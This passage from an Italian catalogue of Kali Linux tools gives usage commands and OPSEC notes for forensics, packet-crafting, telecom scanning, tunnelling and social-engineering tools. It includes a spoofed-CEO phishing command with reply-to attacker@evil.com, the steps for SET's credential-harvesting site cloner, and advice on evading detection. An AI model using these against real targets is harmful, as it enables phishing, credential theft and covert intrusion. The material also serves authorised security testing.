dal filesystem e supporto raw:</strong> Scalpel opera direttamente sui byte grezzi dell'immagine disco, senza necessita di interpretare strutture del filesystem. Questo significa che puo recuperare file anche da partizioni corrotte, filesystem non riconosciuti, spazio non allocato e aree di slack space dove i file cancellati risiedono fino alla sovrascrittura.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Prima di eseguire Scalpel e necessario configurare il file scalpel.conf per abilitare i tipi di file che si desidera recuperare. Per impostazione predefinita tutte le signature sono commentate e devono essere decommentate manualmente.</p><pre><code># Carving con configurazione predefinita\nscalpel disk_image.dd -o output_directory/\n\n# Utilizzo di file di configurazione personalizzato\nscalpel -c /path/to/custom_scalpel.conf disk_image.dd -o recovered/\n\n# Carving da dispositivo raw\nscalpel /dev/sdb -o recovered_files/\n\n# Carving con preview (mostra solo cosa verrebbe estratto)\nscalpel -p disk_image.dd -o preview_output/\n\n# Carving da partizione specifica\nscalpel /dev/sdb1 -o partition_recovery/\n\n# Carving con skip dei primi N byte\nscalpel -b 1048576 disk_image.dd -o skip_output/</code></pre><p>La directory di output deve essere vuota o inesistente. Scalpel creera sottodirectory per ogni tipo di file recuperato, insieme a un file audit.txt che documenta ogni file estratto con offset e dimensione.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nell'analisi forense digitale, Scalpel e utilizzato per il recupero di file cancellati da hard disk, chiavette USB, schede di memoria e qualsiasi altro supporto di archiviazione sequestrato durante un'indagine. La capacita di operare su immagini forensi (formato dd, E01) garantisce l'integrita delle evidenze originali. Per attivita di incident response, lo strumento permette di estrarre rapidamente documenti, immagini e altri artefatti da sistemi compromessi per comprendere l'entita della violazione e i dati potenzialmente esfiltrati. In scenari di data recovery non forense, Scalpel puo recuperare file da dischi con filesystem corrotto o partizioni accidentalmente formattate, dove gli strumenti tradizionali di recupero basati sul filesystem non sono efficaci.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Scalpel e uno strumento di analisi passiva che opera in sola lettura sull'immagine sorgente. Non genera traffico di rete ne modifica il sistema target. L'unica traccia e la presenza dello strumento e dei file recuperati sul sistema dell'analista.</p><p><strong>Impatto operativo:</strong> Il processo di carving puo generare un volume di output molto superiore ai dati originali, con numerosi falsi positivi dovuti a corrispondenze casuali di signature in dati non strutturati. File frammentati (i cui blocchi non sono contigui sul disco) saranno estratti in modo incompleto o corrotto. Il tempo di elaborazione su immagini di grandi dimensioni puo essere significativo.</p><p><strong>Mitigazioni:</strong> Selezionare solo i tipi di file rilevanti per l'indagine nel file di configurazione per ridurre falsi positivi e tempo di elaborazione. Verificare sempre l'integrita dei file recuperati prima di considerarli come evidenze. Utilizzare spazio disco sufficiente per l'output, prevedendo almeno il doppio della dimensione dell'immagine sorgente come margine.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "File_Carving"
    ],
    "notes": null
  },
  {
    "id": "scapy",
    "name": "scapy",
    "version": "2.6.1",
    "icon": "../app/icons/scapy-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/scapy/",
    "desc": "Libreria Python per manipolazione pacchetti: forging, sniffing, fuzzing a basso livello.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Scapy</strong> e una potente libreria e shell interattiva Python per la manipolazione di pacchetti di rete a basso livello. Permette di costruire, inviare, catturare, decodificare e analizzare pacchetti per praticamente qualsiasi protocollo di rete, dal livello 2 (Ethernet, ARP) fino al livello 7 (HTTP, DNS, SNMP). A differenza di strumenti specializzati che svolgono una singola funzione, Scapy e un framework generico che puo sostituire o integrare decine di tool di rete come nmap, hping3, tcpdump e arpspoof. La sua architettura layer-by-layer permette di sovrapporre protocolli con l'operatore /, rendendo la costruzione di pacchetti complessi intuitiva e flessibile. Scapy e utilizzato estensivamente in network security research, exploit development, protocol fuzzing e formazione sulla sicurezza delle reti.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Costruzione e invio pacchetti layer-by-layer:</strong> Scapy permette di costruire pacchetti combinando layer protocollari con l'operatore /. Ad esempio IP(dst=\"target\")/TCP(dport=80,flags=\"S\") crea un pacchetto SYN TCP. Ogni campo di ogni protocollo e modificabile individualmente, permettendo la creazione di pacchetti perfettamente validi o deliberatamente malformati per testing. I pacchetti possono essere inviati singolarmente, in batch o in loop.</p><p><strong>Sniffing e analisi del traffico:</strong> La funzione sniff() cattura pacchetti dalla rete con filtri BPF, con possibilita di applicare callback personalizzate su ogni pacchetto catturato. I pacchetti possono essere analizzati campo per campo, confrontati, salvati in formato PCAP e visualizzati graficamente. Scapy puo anche leggere e scrivere file PCAP per analisi offline del traffico precedentemente catturato.</p><p><strong>Protocol fuzzing e automazione:</strong> Scapy supporta la generazione automatica di pacchetti con campi randomizzati tramite la funzione fuzz(), utile per testare la robustezza di implementazioni protocollari. Integrato con Python, permette di scrivere scanner personalizzati, tool di enumerazione e exploit di rete con poche righe di codice, sfruttando l'intero ecosistema di librerie Python.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Scapy puo essere utilizzato come shell interattiva (eseguendo il comando scapy) o importato come libreria Python in script personalizzati. Richiede privilegi root per l'invio di pacchetti raw.</p><pre><code># Avvio shell interattiva Scapy\nsudo scapy\n\n# Invio ping ICMP\n>>> sr1(IP(dst=\"192.168.1.1\")/ICMP())\n\n# SYN scan su una porta\n>>> ans,unans = sr(IP(dst=\"192.168.1.1\")/TCP(dport=80,flags=\"S\"))\n\n# SYN scan su range di porte\n>>> ans,unans = sr(IP(dst=\"192.168.1.1\")/TCP(dport=(1,1024),flags=\"S\"))\n\n# ARP scan della rete locale\n>>> ans,unans = srp(Ether(dst=\"ff:ff:ff:ff:ff:ff\")/ARP(pdst=\"192.168.1.0/24\"))\n\n# Sniffing con filtro\n>>> sniff(filter=\"tcp port 80\", prn=lambda x: x.summary(), count=20)\n\n# Traceroute\n>>> ans,unans = sr(IP(dst=\"8.8.8.8\",ttl=(1,30))/ICMP())\n\n# DNS query\n>>> sr1(IP(dst=\"8.8.8.8\")/UDP()/DNS(rd=1,qd=DNSQR(qname=\"example.com\")))</code></pre><p>Per utilizzo come libreria in script Python: from scapy.all import *. La documentazione ufficiale include tutorial approfonditi e esempi per ogni protocollo supportato.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nello sviluppo di exploit di rete, Scapy permette di creare pacchetti malformati o specificamente strutturati per sfruttare vulnerabilita in implementazioni protocollari. La flessibilita nella manipolazione dei campi consente di testare edge case e condizioni di errore che strumenti predefiniti non coprono. Per attivita di network reconnaissance, Scapy puo implementare tecniche di scanning avanzate come SYN scan, ACK scan, FIN scan e XMAS scan con pieno controllo sui parametri di ogni pacchetto, oltre a tecniche di OS fingerprinting basate sull'analisi delle risposte. Nel protocol fuzzing e vulnerability research, la capacita di generare automaticamente variazioni di pacchetti validi con campi casuali o incrementali permette di scoprire bug di parsing, buffer overflow e condizioni di denial of service in stack di rete e applicazioni.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I pacchetti generati con Scapy sono facilmente rilevabili da IDS/IPS, specialmente quando presentano caratteristiche anomale come combinazioni di flag TCP invalide, TTL inusuali o sequenze di pacchetti non conformi agli standard protocollari. Lo stack TCP/IP del sistema operativo non gestisce le connessioni iniziate da Scapy, generando RST automatici che possono creare pattern riconoscibili.</p><p><strong>Impatto operativo:</strong> L'invio di pacchetti malformati o flood di pacchetti puo causare instabilita o denial of service su dispositivi di rete e host target. L'utilizzo richiede privilegi root, esponendo il sistema dell'operatore a rischi di sicurezza. Scapy non gestisce nativamente la frammentazione e il reassembly TCP, rendendo alcune operazioni complesse.</p><p><strong>Mitigazioni:</strong> Utilizzare rate limiting nell'invio dei pacchetti per ridurre la visibilita. Testare i payload in ambienti isolati prima di utilizzarli su target reali. Configurare correttamente le regole iptables per sopprimere i RST automatici del kernel quando necessario. Utilizzare interfacce di rete dedicate per evitare interferenze con il traffico legittimo.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "scrounge-ntfs",
    "name": "scrounge-ntfs",
    "version": "0.9",
    "icon": "../app/icons/scrounge-ntfs-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/scrounge-ntfs/",
    "desc": "Recupera file da partizioni NTFS danneggiate ricostruendo MFT entries.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Scrounge-ntfs</strong> è un tool di data recovery specializzato nel recupero di file da partizioni NTFS (New Technology File System) corrotte o danneggiate. Opera ricostruendo le entry della Master File Table (MFT), la struttura fondamentale di NTFS che contiene metadati su ogni file e directory. Quando la MFT è parzialmente danneggiata ma i dati sono ancora fisicamente presenti sui settori del disco, scrounge-ntfs può localizzare e estrarre file che tool di recovery standard non riescono a vedere. È particolarmente efficace in scenari di corruzione del filesystem causata da scollegamento improprio, crash di sistema, settori danneggiati, o danni logici alla struttura NTFS.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>MFT Reconstruction:</strong> Analizza i record MFT danneggiati o parzialmente sovrascritti, ricostruendo le informazioni necessarie per localizzare i dati dei file. Può recuperare entry MFT anche quando la MFT mirror è corrotta.</p><p><strong>Metadata Preservation:</strong> Durante il recupero, preserva i metadati originali dei file: timestamp di creazione/modifica/accesso, attributi, e struttura delle directory quando possibile.</p><p><strong>Sector-Level Scanning:</strong> Scansiona il disco settore per settore cercando signature di record MFT. Non si affida alla struttura del filesystem ma la ricostruisce dai dati raw.</p><p><strong>NTFS-Specific Optimization:</strong> Comprende profondamente le strutture NTFS: attribute headers, resident/non-resident data, runlists per file frammentati, alternate data streams, e compressed files.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Scrounge-ntfs opera su dispositivi block o immagini disco.</p><pre><code># Recovery base da partizione NTFS\nscrounge-ntfs /dev/sdb1 /mnt/recovered/\n# Estrae tutti i file recuperabili in /mnt/recovered/\n\n# Specificare range di settori\nscrounge-ntfs -s 0 -e 1000000 /dev/sdb1 /output/\n# -s: settore iniziale\n# -e: settore finale\n# Utile per limitare scan a porzioni specifiche\n\n# Recovery da immagine disco (dd image)\nscrounge-ntfs disk.img /recovered/\n\n# Recovery da immagine con offset partizione\nscrounge-ntfs -o 2048 disk.img /recovered/\n# -o: offset in settori dall'inizio dell'immagine\n\n# Workflow tipico forense:\n# 1. Crea immagine read-only\ndd if=/dev/sdb of=evidence.img bs=4M conv=noerror,sync\n\n# 2. Calcola hash per chain of custody\nsha256sum evidence.img > evidence.sha256\n\n# 3. Recupera file dall'immagine\nscrounge-ntfs evidence.img /case/recovered/\n\n# 4. Verifica integrity\nsha256sum evidence.img | diff - evidence.sha256</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Data Recovery da Corruzione</strong>, quando una partizione NTFS non monta più a causa di corruzione del filesystem, scrounge-ntfs può recuperare file direttamente dai settori raw. Efficace dopo crash di sistema, rimozione impropria di drive USB, o danni al boot sector.</p><p>Nella <strong>Digital Forensics</strong>, l'analisi di sistemi Windows con filesystem danneggiato è comune. Scrounge-ntfs permette di estrarre evidenze anche quando il sistema operativo non può più accedere al disco.</p><p>Durante <strong>Incident Response Post-Ransomware</strong>, alcuni ransomware danneggiano la struttura NTFS oltre a cifrare i file. Scrounge-ntfs può recuperare file non cifrati da aree non raggiungibili tramite metodi standard.</p><p>Per <strong>Recovery di File Cancellati</strong>, file recentemente cancellati i cui record MFT non sono ancora sovrascritti possono essere recuperati, anche se lo spazio è stato marcato come libero.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Read-Only Operation:</strong> Scrounge-ntfs legge solo dal dispositivo sorgente, non scrive mai su di esso. Preserva l'integrità forense del disco originale.</p><p><strong>NTFS Only:</strong> Funziona esclusivamente con filesystem NTFS. Per altri filesystem (ext4, HFS+, APFS), usare tool specifici come ext4magic, photorec, o testdisk.</p><p><strong>Fragmentation Limitations:</strong> File molto frammentati potrebbero essere recuperati solo parzialmente se le runlist nella MFT sono danneggiate. Cluster non contigui potrebbero mancare.</p><p><strong>Encrypted Files:</strong> File cifrati con EFS (Encrypting File System) o BitLocker vengono recuperati nella loro forma cifrata. La decrittazione richiede le chiavi appropriate.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "File_Carving"
    ],
    "notes": null
  },
  {
    "id": "sctpscan",
    "name": "sctpscan",
    "version": "0.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sctpscan/",
    "desc": "Scanner per protocollo SCTP usato in telecomunicazioni e reti SS7.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SCTPscan</strong> è uno scanner di rete specializzato nel protocollo SCTP (Stream Control Transmission Protocol), un protocollo di trasporto Layer 4 alternativo a TCP/UDP, ampiamente utilizzato in telecomunicazioni. SCTP è il protocollo di trasporto principale per SS7 over IP (SIGTRAN), Diameter (successore di RADIUS per reti mobili), e alcune implementazioni VoIP. A differenza di nmap che ha supporto SCTP limitato, SCTPscan è costruito specificamente per questo protocollo: può enumerare porte SCTP aperte, tentare l'establishment di associazioni, e identificare servizi telco. Essenziale per security assessment di infrastrutture di telecomunicazione, backbone di operatori mobili, e reti di segnalazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SCTP Port Discovery:</strong> Invia INIT chunk SCTP per identificare porte con servizi attivi. Analizza le risposte (INIT-ACK o ABORT) per determinare lo stato della porta. Supporta scan di range o porte specifiche.</p><p><strong>Association Establishment:</strong> Può tentare di completare il 4-way handshake SCTP (INIT, INIT-ACK, COOKIE-ECHO, COOKIE-ACK) per verificare la possibilità di stabilire connessioni complete.</p><p><strong>Telecom-Focused Defaults:</strong> Include preset per porte comuni in ambienti telco: M3UA (2905), M2PA (3565), SUA (14001), Diameter (3868), permettendo scan rapidi di infrastrutture di segnalazione.</p><p><strong>Multi-homing Support:</strong> SCTP supporta multi-homing (multiple IP per associazione). SCTPscan può rilevare e testare endpoint con configurazioni multi-home.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>SCTPscan richiede privilegi root per raw socket SCTP.</p><pre><code># Scan base su singolo host\nsudo sctpscan -t 192.168.1.100\n\n# Scan range di porte specifico\nsudo sctpscan -t 192.168.1.100 -p 1-10000\n\n# Scan subnet\nsudo sctpscan -t 192.168.1.0/24\n\n# Porte SS7/SIGTRAN comuni\nsudo sctpscan -t target -p 2905,2945,3565,14001\n# 2905: M3UA\n# 2945: M3UA alternate\n# 3565: M2PA\n# 14001: SUA\n\n# Porte Diameter\nsudo sctpscan -t target -p 3868,3869\n# 3868: Diameter default\n# 3869: Diameter TLS\n\n# Scan verboso per debug\nsudo sctpscan -t target -p 3868 -v\n\n# Output tipico:\n# SCTP Port 3868 [OPEN] - Diameter\n# SCTP Port 2905 [OPEN] - M3UA\n# SCTP Port 22 [CLOSED]\n\n# Combinazione con nmap per service identification\nnmap -sY -p 3868 --script=default target</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Telecom Security Assessment</strong>, SCTPscan è fondamentale per audit di sicurezza su reti di operatori mobili e fissi. Le interfacce SIGTRAN/Diameter spesso non sono adeguatamente protette, esponendo l'infrastruttura di segnalazione.</p><p>Durante <strong>SS7/SIGTRAN Penetration Testing</strong>, il primo step è identificare endpoint SCTP esposti. M3UA, M2PA, e SUA sono gateway verso la rete SS7 core. L'accesso può permettere intercettazione SMS, tracking location, e altri attacchi telco.</p><p>Nel <strong>VoIP Security Testing</strong>, alcune implementazioni VoIP enterprise usano SCTP per SIP. SCTPscan identifica questi endpoint che potrebbero essere vulnerabili.</p><p>Per <strong>Diameter Security</strong>, le interfacce Diameter in reti 4G/5G gestiscono autenticazione e roaming. Endpoint esposti possono permettere attacchi su subscriber identity e billing.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Protocollo Niche:</strong> SCTP è raro fuori da ambienti telco. Scan SCTP su reti corporate normali produrranno pochi risultati ma potrebbero essere loggati come anomali.</p><p><strong>Telecom Network Isolation:</strong> Le reti di segnalazione telco sono tipicamente isolate da internet pubblico. L'accesso richiede posizione privilegiata (inside roaming partner, compromissione VPN telco, etc.).</p><p><strong>Heavy Monitoring:</strong> Infrastrutture telco critiche sono monitorate intensamente. Scan non autorizzati generano alert immediati e potenziali conseguenze legali severe.</p><p><strong>Authorization Critical:</strong> Assessment di infrastrutture telco richiede autorizzazione formale dall'operatore. Scan non autorizzati su reti SS7 possono costituire reato in molte giurisdizioni.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "secure-socket-funneling",
    "name": "secure-socket-funneling",
    "version": "3.0.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/secure-socket-funneling/",
    "desc": "Tunneling TCP/UDP attraverso TLS con forward/reverse proxy per pivoting sicuro.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Secure Socket Funneling (SSF) è un tool di tunneling network che crea connessioni cifrate con TLS per trasportare traffico TCP e UDP attraverso reti ostili o firewall. A differenza di SSH tunneling che supporta solo TCP, SSF gestisce nativamente entrambi i protocolli, rendendolo ideale per tunneling di DNS, VoIP, e altri protocolli UDP-based. SSF implementa forward port forwarding (-L), reverse port forwarding (-R), SOCKS proxy (-D), e può creare catene multi-hop attraverso relay server multipli. L'architettura client-server con crittografia TLS fa apparire il traffico come normali connessioni HTTPS, facilitando il bypass di firewall e inspection basata su porta.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>TLS Encrypted Tunnels:</strong> Tutto il traffico tra client e server è cifrato con TLS 1.2/1.3. Supporta certificati custom per autenticazione mutua. Il traffico appare come connessione HTTPS standard a inspection superficiale.</p><p><strong>Native UDP Support:</strong> A differenza di SSH, SSF tunnela nativamente traffico UDP senza incapsulamento TCP aggiuntivo. Essenziale per DNS tunneling, VoIP, streaming, e gaming dove la latenza UDP è critica.</p><p><strong>Multiple Proxy Modes:</strong> Forward proxy (-L): porta locale verso host remoto. Reverse proxy (-R): porta remota verso host locale. SOCKS proxy (-D): proxy SOCKS4/5 completo per browsing e tool generici.</p><p><strong>Multi-Hop Chaining:</strong> SSF può creare catene di tunnel attraverso multipli relay server, aggiungendo layer di indirection e rendendo il traceback più difficile.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>SSF ha architettura client (ssf) e server (ssfd). I certificati sono necessari per TLS.</p><pre><code># === SETUP SERVER ===\n# Genera certificati (se non esistenti)\nopenssl req -x509 -nodes -newkey rsa:4096 -keyout server.key -out server.crt -days 365\n\n# Avvia server SSF\nssfd -p 8443\n# Default: ascolta su tutte le interfacce, porta 8443\n\n# === LOCAL PORT FORWARD (-L) ===\n# Forward porta locale 9000 verso internal:22 attraverso relay\nssf -L 9000:internal.target.com:22 -p 8443 relay.server.com\n# Connessioni a localhost:9000 vanno a internal.target.com:22\n\n# === REMOTE PORT FORWARD (-R) ===\n# Esponi porta locale 22 sulla porta 9000 del relay\nssf -R 9000:localhost:22 -p 8443 relay.server.com\n# Connessioni a relay:9000 raggiungono il client su porta 22\n\n# === SOCKS PROXY (-D) ===\n# Crea SOCKS proxy su porta 1080\nssf -D 1080 -p 8443 relay.server.com\n# Configura browser/tool per usare SOCKS5 localhost:1080\n\n# === UDP TUNNELING (-U) ===\n# Forward UDP porta locale 5353 verso DNS interno\nssf -U 5353:10.0.0.1:53 -p 8443 relay.server.com\n# DNS queries a localhost:5353/udp raggiungono 10.0.0.1:53\n\n# === MULTI-HOP ===\n# Attraverso due relay\nssf -L 9000:final:22 -p 8443 relay1.com -p 8443 relay2.com\n\n# === CON CERTIFICATI CUSTOM ===\nssf -L 9000:target:22 -p 8443 relay.com \\\n  --cert client.crt --key client.key --ca ca.crt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Pivoting</strong>, dopo aver compromesso un host in una rete target, SSF permette di creare tunnel verso l'interno. La vittima diventa relay per raggiungere sistemi non direttamente accessibili.</p><p>Nel <strong>Firewall Bypass</strong>, molti firewall permettono traffico HTTPS (443) ma bloccano SSH (22). SSF su porta 443 appare come HTTPS legittimo, bypassando policy restrittive.</p><p>Per <strong>UDP Protocol Tunneling</strong>, applicazioni che richiedono UDP (DNS, VoIP, some VPN) possono essere tunnelate attraverso ambienti che bloccano UDP ma permettono TCP/HTTPS.</p><p>Durante <strong>Red Team Operations</strong>, SSF fornisce canali di comunicazione cifrati che si mimetizzano nel traffico HTTPS normale. I certificati custom permettono autenticazione mutua escludendo altri client.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>TLS Appearance:</strong> Il traffico appare come HTTPS ma deep packet inspection può notare pattern anomali: certificati self-signed, SNI mancante, traffic patterns non-HTTP.</p><p><strong>Certificate Management:</strong> Usare CA e certificati propri per autenticazione. Certificati di default sono conosciuti. La compromissione della CA compromette tutto il sistema.</p><p><strong>Logging:</strong> Sia client che server possono essere configurati per logging dettagliato. In operazioni sensibili, disabilitare o redirigere log appropriatamente.</p><p><strong>Endpoint Detection:</strong> EDR possono rilevare binary SSF o behavior di tunneling (molte connessioni a singolo host, traffic patterns regolari). Considerare obfuscation o uso di porte standard.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "sendemail",
    "name": "sendemail",
    "version": "1.56",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sendemail/",
    "desc": "Invia email da CLI con supporto SMTP auth, TLS e allegati per test phishing.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>sendEmail</strong> e un client email da riga di comando leggero e versatile, scritto in Perl, progettato per l'invio di email da script e terminale con supporto completo per autenticazione SMTP, connessioni TLS/SSL e allegati. A differenza di client email grafici, sendEmail e ottimizzato per l'automazione e l'integrazione in pipeline di testing, rendendolo uno strumento essenziale per simulazioni di phishing autorizzate, notifiche automatizzate e verifica della configurazione dei server di posta. Lo strumento supporta molteplici metodi di autenticazione (PLAIN, LOGIN, CRAM-MD5), puo inviare email in formato HTML con immagini embedded, e gestisce automaticamente la codifica MIME per gli allegati. La sua semplicita d'uso e la possibilita di spoofing dell'indirizzo mittente lo rendono particolarmente utile per test di awareness sulla sicurezza email nelle organizzazioni.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Invio SMTP con autenticazione e TLS:</strong> sendEmail supporta connessioni a server SMTP con autenticazione tramite username e password, e cifratura del canale tramite TLS (STARTTLS sulla porta 587) o SSL diretto (porta 465). Gestisce automaticamente la negoziazione del protocollo di sicurezza e supporta certificati self-signed, permettendo l'invio attraverso qualsiasi server SMTP configurato, inclusi Gmail, Office 365 e server aziendali.</p><p><strong>Spoofing mittente e header personalizzati:</strong> Lo strumento permette di specificare un indirizzo mittente arbitrario nel campo From, utile per test di phishing autorizzati. Supporta anche l'aggiunta di header email personalizzati come Reply-To, X-Mailer e altri, permettendo di replicare fedelmente le caratteristiche di email legittime. Questa funzionalita e fondamentale per valutare l'efficacia dei controlli anti-spoofing (SPF, DKIM, DMARC) dell'organizzazione target.</p><p><strong>Allegati e formato HTML:</strong> sendEmail gestisce l'invio di file allegati di qualsiasi tipo con codifica MIME automatica, e supporta il corpo del messaggio in formato HTML per la creazione di email visivamente convincenti. E possibile includere multiple allegati in un singolo messaggio, rendendolo adatto per l'invio di payload in campagne di social engineering controllate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>sendEmail richiede come minimo un indirizzo destinatario, un server SMTP e il corpo del messaggio. Per server che richiedono autenticazione e necessario specificare credenziali e abilitare TLS.</p><pre><code># Invio email semplice\nsendemail -f mittente@dominio.com -t destinatario@dominio.com -u \"Oggetto\" -m \"Corpo del messaggio\" -s smtp.server.com\n\n# Con autenticazione SMTP e TLS\nsendemail -f test@azienda.com -t target@azienda.com -u \"Verifica account\" -m \"Clicca qui per verificare\" -s smtp.server.com:587 -xu username -xp password -o tls=yes\n\n# Email HTML con allegato\nsendemail -f hr@azienda.com -t dipendente@azienda.com -u \"Documento importante\" -m \"<h1>Documento allegato</h1><p>Aprire il file allegato.</p>\" -o message-content-type=html -a documento.pdf -s smtp.server.com:587 -xu user -xp pass -o tls=yes\n\n# Multipli destinatari\nsendemail -f noreply@azienda.com -t user1@azienda.com,user2@azienda.com -u \"Avviso\" -m \"Messaggio\" -s smtp.server.com\n\n# Con header personalizzato Reply-To\nsendemail -f ceo@azienda.com -t target@azienda.com -u \"Urgente\" -m \"Messaggio\" -s smtp.server.com -o reply-to=attacker@evil.com</code></pre><p>Nota: per l'invio tramite servizi come Gmail e necessario abilitare l'accesso per app meno sicure o utilizzare password specifiche per applicazioni se l'autenticazione a due fattori e attiva.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nelle campagne di phishing assessment autorizzate, sendEmail viene utilizzato per inviare email di test che simulano attacchi di spear-phishing, verificando la capacita dei dipendenti di riconoscere tentativi di social engineering e l'efficacia dei filtri anti-phishing aziendali. La possibilita di personalizzare ogni aspetto dell'email rende le simulazioni realistiche. Per la verifica della sicurezza dell'infrastruttura email, lo strumento permette di testare i controlli SPF, DKIM e DMARC inviando email con mittente spoofato e verificando se vengono correttamente bloccate o segnalate. In contesti di automazione e scripting, sendEmail si integra perfettamente in pipeline di monitoring e alerting, permettendo l'invio di notifiche email da script di penetration testing o strumenti di monitoraggio personalizzati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I server SMTP registrano tutte le connessioni con indirizzo IP sorgente, timestamp e dettagli dell'autenticazione. Gli header delle email contengono l'indirizzo IP di origine nel campo Received, tracciabile fino al sistema di invio. I sistemi di protezione email moderni (Proofpoint, Mimecast) analizzano header, contenuto e allegati per identificare tentativi di phishing.</p><p><strong>Impatto operativo:</strong> L'invio di email con mittente spoofato puo violare le policy aziendali e, se non autorizzato, costituire reato. Server SMTP con rate limiting possono bloccare l'IP dopo troppi invii. Le email con allegati potenzialmente pericolosi saranno probabilmente quarantinate dai gateway di sicurezza email.</p><p><strong>Mitigazioni:</strong> Ottenere sempre autorizzazione scritta prima di condurre campagne di phishing. Utilizzare server SMTP dedicati per i test per evitare il blacklisting di server di produzione. Coordinare con il team IT per creare whitelist temporanee se necessario per i test. Documentare tutti gli invii per audit trail completo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Social_Engineering"
    ],
    "notes": null
  },
  {
    "id": "set",
    "name": "set",
    "version": "8.0.3",
    "icon": "../app/icons/set-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/set/",
    "desc": "Social Engineering Toolkit: phishing, credential harvester, payload injection e spear-phishing.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SET</strong> (Social Engineering Toolkit) e il framework open source di riferimento per la simulazione di attacchi di ingegneria sociale, sviluppato da David Kennedy e mantenuto da TrustedSec. SET integra una vasta gamma di vettori di attacco che sfruttano la componente umana della sicurezza, inclusi clonazione di siti web per credential harvesting, campagne di spear-phishing con allegati malevoli, generazione di payload con integrazione Metasploit, attacchi basati su media fisici (USB/CD autorun) e tecniche di QRCode phishing. Il toolkit presenta un'interfaccia a menu guidata che rende accessibili attacchi complessi anche senza conoscenze approfondite di programmazione. SET e lo strumento standard utilizzato da red team e penetration tester per valutare la resilienza delle organizzazioni agli attacchi di social engineering, ed e incluso di default in Kali Linux.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Website cloning e credential harvesting:</strong> SET puo clonare qualsiasi sito web (portali aziendali, pagine di login di servizi cloud, webmail) creando una replica identica che cattura le credenziali inserite dagli utenti prima di reindirizzarli al sito legittimo. Il modulo gestisce automaticamente la configurazione del web server locale, la cattura delle POST request e il logging delle credenziali, richiedendo all'operatore solo l'URL del sito da clonare.</p><p><strong>Spear-phishing con payload integrati:</strong> Il modulo di spear-phishing permette di creare email personalizzate con allegati malevoli in vari formati (PDF, Office, eseguibili). SET integra direttamente Metasploit per la generazione di payload, supportando reverse shell, meterpreter e altri handler. Le email possono essere inviate singolarmente o in massa utilizzando liste di destinatari, con supporto per server SMTP personalizzati e Gmail.</p><p><strong>Vettori di attacco multipli e modulari:</strong> Oltre al phishing web e email, SET include moduli per attacchi via media infetti (generazione di autorun per USB), HID attack (emulazione tastiera tramite Teensy/Arduino), wireless access point attack (creazione di rogue AP con captive portal), e generazione di QRCode malevoli. Ogni modulo e configurabile e puo essere combinato con altri per creare catene di attacco complesse.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>SET si avvia tramite il comando setoolkit e presenta un'interfaccia a menu interattiva. E necessario eseguirlo con privilegi root per le funzionalita che richiedono binding su porte privilegiate.</p><pre><code># Avvio SET con privilegi root\nsudo setoolkit\n\n# Navigazione menu per credential harvester\n# 1) Social-Engineering Attacks\n# 2) Website Attack Vectors\n# 3) Credential Harvester Attack Method\n# 2) Site Cloner\n# Inserire URL del sito da clonare\n\n# Spear-phishing con allegato\n# 1) Social-Engineering Attacks\n# 1) Spear-Phishing Attack Vectors\n# 1) Perform a Mass Email Attack\n# Selezionare tipo di payload\n\n# Generazione payload USB autorun\n# 1) Social-Engineering Attacks\n# 3) Infectious Media Generator\n# Selezionare tipo di 